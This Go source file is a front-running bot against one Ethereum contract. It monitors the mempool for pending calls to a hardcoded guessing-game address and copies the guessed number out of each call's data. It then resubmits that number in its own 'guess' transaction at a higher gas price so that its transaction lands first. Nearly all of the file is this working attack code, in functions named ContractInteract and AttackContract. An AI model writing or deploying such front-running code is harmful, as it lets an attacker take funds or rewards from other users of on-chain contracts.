package service

import (
	"context"
	"crypto/ecdsa"
	"encoding/hex"
	"fmt"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/ethclient/gethclient"
	"github.com/ethereum/go-ethereum/rpc"
	"math/big"
	"os"
	"time"
)

const (
	ContractAddress  = "0xd2818eEfD81A0CFCb7a52849c31ee764aeAEEFd5"
	MethodIDContract = "9189fec1"
)

func ContractInteract() error {
	ethClient, err := ethclient.Dial(os.Getenv("RPC"))
	if err != nil {
		return err
	}

	client, err := rpc.Dial(os.Getenv("RPC"))
	if err != nil {
		return err
	}
	gethClient := gethclient.New(client)

	txs := make(chan *types.Transaction)
	subscription, err := gethClient.SubscribeFullPendingTransactions(context.Background(), txs)
	if err != nil {
		fmt.Printf("Failed to subscribe to pending transactions: %v", err)
		time.Sleep(5 * time.Second)
	}

	targetAddress := common.HexToAddress(ContractAddress)
	seenTxs := make(map[common.Hash]bool)
	for {
		select {
		case tx := <-txs:
			txHash := tx.Hash()
			if !seenTxs[txHash] {
				seenTxs[txHash] = true
				if tx.To() != nil && *tx.To() == targetAddress {
					fmt.Printf("New pending transaction to target address:\n")
					fmt.Printf("Hash: %s\n", tx.Hash().Hex())
					fmt.Printf("To: %s\n", tx.To().Hex())
					fmt.Printf("Data: %s\n", hex.EncodeToString(tx.Data()))

					data := tx.Data()
					methodID := data[:4]
					methodIDHex := hex.EncodeToString(methodID)
					if methodIDHex == MethodIDContract {
						argument := data[4:36]
						correctNumber := new(big.Int).SetBytes(argument)
						err = AttackContract(ethClient, correctNumber.Int64(), tx.GasPrice().Int64())
					}
				}
			}
		case err = <-subscription.Err():
			fmt.Printf("Subscription error: %v", err)
		}
	}
}

func AttackContract(ethClient *ethclient.Client, correctNumber int64, gasPriceTx int64) error {

	privateKey, err := crypto.HexToECDSA(os.Getenv("PRIVATE_KEY"))
	if err != nil {
		fmt.Printf("Failed to parse private key: %v", err)
	}

	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		fmt.Printf("Cannot assert type: publicKey is not of type *ecdsa.PublicKey")
	}

	fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA)
	nonce, err := ethClient.PendingNonceAt(context.Background(), fromAddress)
	if err != nil {
		fmt.Printf("Failed to get pending nonce: %v", err)
	}

	methodID := crypto.Keccak256([]byte("guess(uint256)"))[:4]

	number := new(big.Int)
	number.SetInt64(correctNumber)
	paddedNumber := common.LeftPadBytes(number.Bytes(), 32)

	var data []byte
	data = append(data, methodID...)
	data = append(data, paddedNumber...)

	gasLimit := uint64(100000)
	gasPrice := big.NewInt(gasPriceTx + 10000000000)

	contractAddress := common.HexToAddress(ContractAddress)
	value := new(big.Int)
	value.SetString("1000000000000000", 10)
	txData := &types.LegacyTx{
		Nonce:    nonce,
		To:       &contractAddress,
		Value:    value,
		Gas:      gasLimit,
		GasPrice: gasPrice,
		Data:     data,
	}

	tx := types.NewTx(txData)
	chainID, err := ethClient.NetworkID(context.Background())
	if err != nil {
		fmt.Printf("Failed to get chain ID: %v", err)
	}

	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey)
	if err != nil {
		fmt.Printf("Failed to sign tx: %v", err)
	}

	err = ethClient.SendTransaction(context.Background(), signedTx)
	if err != nil {
		fmt.Printf("Failed to send tx: %v", err)
	}
	fmt.Printf("tx sent: %s\n", signedTx.Hash().Hex())

	return nil
}
